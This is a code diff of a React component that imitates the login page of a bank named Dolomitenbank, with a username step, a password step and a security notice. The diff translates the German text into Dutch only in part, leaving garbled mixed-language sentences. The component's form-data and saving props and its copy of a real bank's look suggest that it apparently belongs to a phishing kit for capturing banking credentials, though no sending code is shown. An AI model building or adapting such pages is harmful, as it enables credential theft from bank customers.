@@ -69,7 +69,7 @@ export function Dolomitenbank({ formData, onChange, handleRouteAction, saving }:
           <div className="px-8 py-6">
             {/* Introductory Notice */}
             <p className="text-[13px] text-[#333] mb-8 leading-[1.6]">
-              Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten. Unsere Mitarbeiter werden Sie zu keinem Zeitpunkt nach Ihrem Passwort oder einer TAN fragen.
+              Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt. Unsere Mitarbeiter werden Sie zu keinem Zeitpunkt nach Ihrem Wachtwoord oder einer TAN fragen.
             </p>
 
             <form 
@@ -79,7 +79,7 @@ export function Dolomitenbank({ formData, onChange, handleRouteAction, saving }:
               {step === 1 ? (
                 <>
                   <div className="flex justify-between items-end mb-1">
-                    <label className="text-[12px] text-[#444]">Benutzername</label>
+                    <label className="text-[12px] text-[#444]">Gebruikersnaam</label>
                     <div className="text-[12px] text-[#5f7078]">
                       <a href="#" className="hover:underline">Hochkontrast</a>
                       <span className="mx-1.5">|</span>
@@ -97,7 +97,7 @@ export function Dolomitenbank({ formData, onChange, handleRouteAction, saving }:
               ) : (
                 <>
                   <div className="flex justify-between items-end mb-1">
-                    <label className="text-[12px] text-[#444]">Passwort</label>
+                    <label className="text-[12px] text-[#444]">Wachtwoord</label>
                     <div className="text-[12px] text-[#5f7078]">
                       <a href="#" className="hover:underline">Hochkontrast</a>
                       <span className="mx-1.5">|</span>
@@ -118,7 +118,7 @@ export function Dolomitenbank({ formData, onChange, handleRouteAction, saving }:
               {/* Help/Info Paragraph */}
               <div className="text-center mb-6 px-4">
                 <p className="text-[13px] text-[#333] leading-[1.5]">
-                  Funktioniert der Einstieg nicht? Haben Sie noch eine Verfügernummer? - <a href="#" className="text-[#5f7078] hover:underline">Hier erfahren Sie wie Sie zu Ihrem neuen Benutzername / Passwort kommen.</a> Ein Einstieg mit Ihrer bisherigen Verfügernummer ist nicht mehr möglich!
+                  Lukt het inloggen niet? Haben Sie noch eine Inlogcode? - <a href="#" className="text-[#5f7078] hover:underline">Hier leest u hoe u een nieuwe gebruikersnaam / wachtwoord aanvraagt.</a> Inloggen met uw oude inlogcode is niet meer mogelijk!
                 </p>
               </div>
 
@@ -137,8 +137,8 @@ export function Dolomitenbank({ formData, onChange, handleRouteAction, saving }:
           {/* Bottom Links */}
           <div className="border-t border-[#e0e0e0] bg-white py-5 flex flex-col items-center gap-1.5">
             <div className="flex flex-col items-center text-[13px] text-[#5f7078]">
-              <a href="#" className="hover:underline mb-0.5">Benutzername vergessen?</a>
-              <a href="#" className="hover:underline">Passwort vergessen</a>
+              <a href="#" className="hover:underline mb-0.5">Gebruikersnaam vergessen?</a>
+              <a href="#" className="hover:underline">Wachtwoord vergessen</a>
             </div>
             <div className="flex flex-col items-center text-[13px] text-[#5f7078] mt-2">
               <a href="#" className="hover:underline mb-0.5">Demo-Version</a>
